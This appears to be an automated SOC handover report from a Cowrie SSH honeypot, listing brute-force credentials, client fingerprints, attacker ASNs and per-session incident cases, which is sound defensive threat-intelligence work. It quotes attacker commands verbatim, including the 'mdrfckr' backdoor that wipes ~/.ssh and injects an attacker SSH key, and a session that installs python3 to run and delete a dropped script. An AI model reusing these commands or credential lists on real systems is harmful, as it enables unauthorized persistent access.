# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T23:12:36Z |
| **Shift Time** | 23:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **109** |
| Confirmed Threats | **97** |
| False Positives Filtered | **12** (11.0%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **14** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **48** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **95** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **18** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **72** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `345gs5662d34` | 20 |
| `ubuntu` | 5 |
| `accessories` | 2 |
| `ramses` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `LeitboGi0ro` | 4 |
| `123456` | 3 |
| `123zxc` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 14 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `123zxc` | 3 |
| `root` | `123@@@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `accessories` | `123456` | `103.90.227.203` | 2026-07-02T20:56:21 |
| `345gs5662d34` | `345gs5662d34` | `103.90.227.203` | 2026-07-02T20:56:26 |
| `accessories` | `3245gs5662d34` | `103.90.227.203` | 2026-07-02T20:56:28 |
| `oracle` | `azerty` | `45.198.224.120` | 2026-07-02T20:57:14 |
| `ramses` | `ramses123` | `139.198.113.29` | 2026-07-02T20:58:44 |
| `345gs5662d34` | `345gs5662d34` | `139.198.113.29` | 2026-07-02T20:58:48 |
| `ramses` | `3245gs5662d34` | `139.198.113.29` | 2026-07-02T20:58:49 |
| `root` | `123zxc` | `185.242.3.195` | 2026-07-02T21:02:50 |
| `root` | `qwe12345^` | `45.205.1.42` | 2026-07-02T21:08:18 |
| `root` | `1a2b3c` | `45.198.224.120` | 2026-07-02T21:08:40 |
| `root` | `123@@@` | `132.226.64.178` | 2026-07-02T21:13:12 |
| `root` | `LeitboGi0ro` | `132.226.64.178` | 2026-07-02T21:13:15 |
| `user` | `qwertylinux` | `45.198.224.120` | 2026-07-02T21:20:24 |
| `webdb` | `123456` | `45.120.216.232` | 2026-07-02T21:21:24 |
| `345gs5662d34` | `345gs5662d34` | `45.120.216.232` | 2026-07-02T21:21:30 |
| `webdb` | `3245gs5662d34` | `45.120.216.232` | 2026-07-02T21:21:31 |
| `ubuntu` | `asd1234567` | `45.205.1.42` | 2026-07-02T21:22:26 |
| `root` | `781011` | `218.144.90.41` | 2026-07-02T21:31:20 |
| `345gs5662d34` | `345gs5662d34` | `218.144.90.41` | 2026-07-02T21:31:24 |
| `root` | `3245gs5662d34` | `218.144.90.41` | 2026-07-02T21:31:25 |
| `root` | `pa55word` | `45.198.224.120` | 2026-07-02T21:31:51 |
| `root` | `1006` | `10.0.0.73` | 2026-07-02T21:33:49 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T21:33:52 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T21:33:54 |
| `root` | `Rjkj@free7248#8` | `45.205.1.42` | 2026-07-02T21:36:09 |
| `root` | `Lx123456!` | `10.0.0.73` | 2026-07-02T21:36:52 |
| `root` | `Os@123456` | `10.0.0.73` | 2026-07-02T21:37:44 |
| `root` | `Down4Ever` | `10.0.0.73` | 2026-07-02T21:38:50 |
| `root` | `qqww` | `10.0.0.73` | 2026-07-02T21:41:24 |
| `root` | `London123` | `10.0.0.73` | 2026-07-02T21:42:14 |
| `root` | `12QWASZX` | `175.119.225.68` | 2026-07-02T21:42:37 |
| `345gs5662d34` | `345gs5662d34` | `175.119.225.68` | 2026-07-02T21:42:40 |
| `root` | `3245gs5662d34` | `175.119.225.68` | 2026-07-02T21:42:42 |
| `root` | `123zxc` | `10.0.0.73` | 2026-07-02T21:43:08 |
| `ftp2` | `ftp2` | `45.198.224.120` | 2026-07-02T21:43:14 |
| `root` | `Gg123456!` | `10.0.0.73` | 2026-07-02T21:47:49 |
| `www-data` | `p@55w0rd` | `45.205.1.42` | 2026-07-02T21:51:06 |
| `img01` | `img01` | `61.219.156.91` | 2026-07-02T21:51:48 |
| `345gs5662d34` | `345gs5662d34` | `61.219.156.91` | 2026-07-02T21:51:51 |
| `img01` | `3245gs5662d34` | `61.219.156.91` | 2026-07-02T21:51:53 |
| `root` | `Wa123456!` | `10.0.0.73` | 2026-07-02T21:53:17 |
| `tb` | `tb` | `152.32.182.8` | 2026-07-02T21:54:23 |
| `345gs5662d34` | `345gs5662d34` | `152.32.182.8` | 2026-07-02T21:54:24 |
| `tb` | `3245gs5662d34` | `152.32.182.8` | 2026-07-02T21:54:24 |
| `ftpuser` | `ftpuser` | `45.198.224.120` | 2026-07-02T21:54:41 |
| `root` | `Lb123456` | `10.0.0.73` | 2026-07-02T21:57:34 |
| `admin` | `admin` | `115.190.62.211` | 2026-07-02T22:00:54 |
| `testuser2` | `testuser2` | `10.0.0.73` | 2026-07-02T22:01:51 |
| `testuser2` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T22:01:56 |
| `23` | `root` | `94.154.43.140` | 2026-07-02T22:02:16 |
| `ubuntu` | `1z2x3c` | `45.205.1.42` | 2026-07-02T22:05:37 |
| `root` | `789456` | `45.198.224.120` | 2026-07-02T22:06:18 |
| `root` | `secret` | `45.198.224.120` | 2026-07-02T22:17:57 |
| `root` | `Password#123` | `45.205.1.42` | 2026-07-02T22:19:27 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T22:29:32 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T22:29:32 |
| `root` | `Password#12345678` | `45.198.224.120` | 2026-07-02T22:29:35 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T22:29:35 |
| `ubuntu` | `qwert12345` | `45.205.1.42` | 2026-07-02T22:33:32 |
| `sugon` | `sugon` | `185.242.3.195` | 2026-07-02T22:34:46 |
| `root` | `test@` | `106.13.39.89` | 2026-07-02T22:38:10 |
| `ubuntu` | `hadoop123456` | `45.198.224.120` | 2026-07-02T22:41:20 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-02T22:42:48 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-02T22:42:48 |
| `root` | `Sa@123` | `58.20.201.4` | 2026-07-02T22:44:20 |
| `345gs5662d34` | `345gs5662d34` | `58.20.201.4` | 2026-07-02T22:44:24 |
| `root` | `3245gs5662d34` | `58.20.201.4` | 2026-07-02T22:44:26 |
| `root` | `654654654` | `103.97.101.25` | 2026-07-02T22:45:04 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-02T22:45:08 |
| `root` | `3245gs5662d34` | `103.97.101.25` | 2026-07-02T22:45:10 |
| `alex` | `123456` | `45.205.1.42` | 2026-07-02T22:47:34 |
| `ubuntu` | `asd` | `45.198.224.120` | 2026-07-02T22:52:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **109** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 41 |
| Go SSH scanner | 23 |
| Paramiko (Python) | 9 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 30 | 12 |
| `16443846184e...` | Generic scanner | 22 | 3 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `6372ee695756...` | Modern SSH client | 3 | 1 |
| `af8223ac9914...` | libssh-based | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 30 | 12 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 2 | 2 | libssh-based |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.13.39.89`, `103.97.101.25`, `45.120.216.232`, `103.90.227.203`, `61.219.156.91`, `218.144.90.41`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **27** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | LOW |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ee09f877771b

| Field | Detail |
|---|---|
| **Source IP** | `103.90.227[.]203` |
| **First Seen** | 2026-07-02 20:56 |
| **Last Seen** | 2026-07-02 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:56:20` | `cowrie.session.connect` |
| `2026-07-02 20:56:20` | `cowrie.client.version` |
| `2026-07-02 20:56:20` | `cowrie.client.kex` |
| `2026-07-02 20:56:21` | `cowrie.login.success` |
| `2026-07-02 20:56:22` | `cowrie.session.params` |
| `2026-07-02 20:56:22` | `cowrie.command.input` |
| `2026-07-02 20:56:22` | `cowrie.command.failed` |
| `2026-07-02 20:56:23` | `cowrie.log.closed` |
| `2026-07-02 20:56:24` | `cowrie.session.params` |
| `2026-07-02 20:56:24` | `cowrie.command.input` |
| `2026-07-02 20:56:24` | `cowrie.session.file_download` |
| `2026-07-02 20:56:24` | `cowrie.log.closed` |
| `2026-07-02 20:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.90.227[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.90.227[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c95e2adaf0d

| Field | Detail |
|---|---|
| **Source IP** | `103.90.227[.]203` |
| **First Seen** | 2026-07-02 20:56 |
| **Last Seen** | 2026-07-02 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:56:24` | `cowrie.session.connect` |
| `2026-07-02 20:56:24` | `cowrie.client.version` |
| `2026-07-02 20:56:24` | `cowrie.client.kex` |
| `2026-07-02 20:56:26` | `cowrie.login.success` |
| `2026-07-02 20:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.90.227[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.90.227[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55702af162f9

| Field | Detail |
|---|---|
| **Source IP** | `103.90.227[.]203` |
| **First Seen** | 2026-07-02 20:56 |
| **Last Seen** | 2026-07-02 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:56:26` | `cowrie.session.connect` |
| `2026-07-02 20:56:26` | `cowrie.client.version` |
| `2026-07-02 20:56:26` | `cowrie.client.kex` |
| `2026-07-02 20:56:28` | `cowrie.login.success` |
| `2026-07-02 20:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.90.227[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.90.227[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-383e5cbc7395

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 20:57 |
| **Last Seen** | 2026-07-02 20:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:57:07` | `cowrie.session.connect` |
| `2026-07-02 20:57:09` | `cowrie.client.version` |
| `2026-07-02 20:57:09` | `cowrie.client.kex` |
| `2026-07-02 20:57:14` | `cowrie.login.success` |
| `2026-07-02 20:57:18` | `cowrie.session.params` |
| `2026-07-02 20:57:18` | `cowrie.command.input` |
| `2026-07-02 20:57:19` | `cowrie.log.closed` |
| `2026-07-02 20:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c84f4bf83409

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-07-02 20:58 |
| **Last Seen** | 2026-07-02 20:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:58:43` | `cowrie.session.connect` |
| `2026-07-02 20:58:43` | `cowrie.client.version` |
| `2026-07-02 20:58:43` | `cowrie.client.kex` |
| `2026-07-02 20:58:44` | `cowrie.login.success` |
| `2026-07-02 20:58:45` | `cowrie.session.params` |
| `2026-07-02 20:58:45` | `cowrie.command.input` |
| `2026-07-02 20:58:45` | `cowrie.command.failed` |
| `2026-07-02 20:58:45` | `cowrie.log.closed` |
| `2026-07-02 20:58:46` | `cowrie.session.params` |
| `2026-07-02 20:58:46` | `cowrie.command.input` |
| `2026-07-02 20:58:46` | `cowrie.session.file_download` |
| `2026-07-02 20:58:46` | `cowrie.log.closed` |
| `2026-07-02 20:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df2a8542248

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-07-02 20:58 |
| **Last Seen** | 2026-07-02 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:58:46` | `cowrie.session.connect` |
| `2026-07-02 20:58:46` | `cowrie.client.version` |
| `2026-07-02 20:58:47` | `cowrie.client.kex` |
| `2026-07-02 20:58:48` | `cowrie.login.success` |
| `2026-07-02 20:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d11bf47695c

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-07-02 20:58 |
| **Last Seen** | 2026-07-02 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:58:48` | `cowrie.session.connect` |
| `2026-07-02 20:58:48` | `cowrie.client.version` |
| `2026-07-02 20:58:48` | `cowrie.client.kex` |
| `2026-07-02 20:58:49` | `cowrie.login.success` |
| `2026-07-02 20:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba709c0e4d04

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 21:02 |
| **Last Seen** | 2026-07-02 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:02:50` | `cowrie.session.connect` |
| `2026-07-02 21:02:50` | `cowrie.client.version` |
| `2026-07-02 21:02:50` | `cowrie.client.kex` |
| `2026-07-02 21:02:50` | `cowrie.login.success` |
| `2026-07-02 21:02:51` | `cowrie.session.params` |
| `2026-07-02 21:02:51` | `cowrie.command.input` |
| `2026-07-02 21:02:51` | `cowrie.log.closed` |
| `2026-07-02 21:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e414ed10b122

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 21:08 |
| **Last Seen** | 2026-07-02 21:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:08:16` | `cowrie.session.connect` |
| `2026-07-02 21:08:16` | `cowrie.client.version` |
| `2026-07-02 21:08:16` | `cowrie.client.kex` |
| `2026-07-02 21:08:18` | `cowrie.login.success` |
| `2026-07-02 21:08:19` | `cowrie.session.params` |
| `2026-07-02 21:08:19` | `cowrie.command.input` |
| `2026-07-02 21:08:20` | `cowrie.log.closed` |
| `2026-07-02 21:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcee4319c091

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 21:08 |
| **Last Seen** | 2026-07-02 21:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:08:34` | `cowrie.session.connect` |
| `2026-07-02 21:08:35` | `cowrie.client.version` |
| `2026-07-02 21:08:35` | `cowrie.client.kex` |
| `2026-07-02 21:08:40` | `cowrie.login.success` |
| `2026-07-02 21:08:44` | `cowrie.session.params` |
| `2026-07-02 21:08:44` | `cowrie.command.input` |
| `2026-07-02 21:08:46` | `cowrie.log.closed` |
| `2026-07-02 21:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1828996e2199

| Field | Detail |
|---|---|
| **Source IP** | `132.226.64[.]178` |
| **First Seen** | 2026-07-02 21:13 |
| **Last Seen** | 2026-07-02 21:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:13:12` | `cowrie.session.connect` |
| `2026-07-02 21:13:12` | `cowrie.client.version` |
| `2026-07-02 21:13:12` | `cowrie.client.kex` |
| `2026-07-02 21:13:12` | `cowrie.login.success` |
| `2026-07-02 21:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `132.226.64[.]178` to AbuseIPDB if not already reported
- [ ] Block `132.226.64[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35dc561f6ec

| Field | Detail |
|---|---|
| **Source IP** | `132.226.64[.]178` |
| **First Seen** | 2026-07-02 21:13 |
| **Last Seen** | 2026-07-02 21:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:13:15` | `cowrie.session.connect` |
| `2026-07-02 21:13:15` | `cowrie.client.version` |
| `2026-07-02 21:13:15` | `cowrie.client.kex` |
| `2026-07-02 21:13:15` | `cowrie.login.success` |
| `2026-07-02 21:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `132.226.64[.]178` to AbuseIPDB if not already reported
- [ ] Block `132.226.64[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-509e500525b0

| Field | Detail |
|---|---|
| **Source IP** | `132.226.64[.]178` |
| **First Seen** | 2026-07-02 21:13 |
| **Last Seen** | 2026-07-02 21:15 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:13:39` | `cowrie.session.connect` |
| `2026-07-02 21:13:39` | `cowrie.client.version` |
| `2026-07-02 21:13:39` | `cowrie.client.kex` |
| `2026-07-02 21:13:40` | `cowrie.login.success` |
| `2026-07-02 21:13:41` | `cowrie.session.file_upload` |
| `2026-07-02 21:13:41` | `cowrie.session.params` |
| `2026-07-02 21:13:41` | `cowrie.command.input` |
| `2026-07-02 21:13:41` | `cowrie.command.input` |
| `2026-07-02 21:13:41` | `cowrie.command.input` |
| `2026-07-02 21:13:41` | `cowrie.command.failed` |
| `2026-07-02 21:13:41` | `cowrie.log.closed` |
| `2026-07-02 21:13:42` | `cowrie.session.params` |
| `2026-07-02 21:13:42` | `cowrie.command.input` |
| `2026-07-02 21:13:42` | `cowrie.log.closed` |
| `2026-07-02 21:13:43` | `cowrie.session.params` |
| `2026-07-02 21:13:43` | `cowrie.command.input` |
| `2026-07-02 21:13:43` | `cowrie.log.closed` |
| `2026-07-02 21:13:44` | `cowrie.session.params` |
| `2026-07-02 21:13:44` | `cowrie.command.input` |
| `2026-07-02 21:13:44` | `cowrie.command.failed` |
| `2026-07-02 21:13:44` | `cowrie.command.failed` |
| `2026-07-02 21:14:45` | `cowrie.session.params` |
| `2026-07-02 21:14:45` | `cowrie.command.input` |
| `2026-07-02 21:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `132.226.64[.]178` to AbuseIPDB if not already reported
- [ ] Block `132.226.64[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c227152f40a2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 21:20 |
| **Last Seen** | 2026-07-02 21:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:20:16` | `cowrie.session.connect` |
| `2026-07-02 21:20:18` | `cowrie.client.version` |
| `2026-07-02 21:20:18` | `cowrie.client.kex` |
| `2026-07-02 21:20:24` | `cowrie.login.success` |
| `2026-07-02 21:20:27` | `cowrie.session.params` |
| `2026-07-02 21:20:27` | `cowrie.command.input` |
| `2026-07-02 21:20:29` | `cowrie.log.closed` |
| `2026-07-02 21:20:29` | `cowrie.session.closed` |
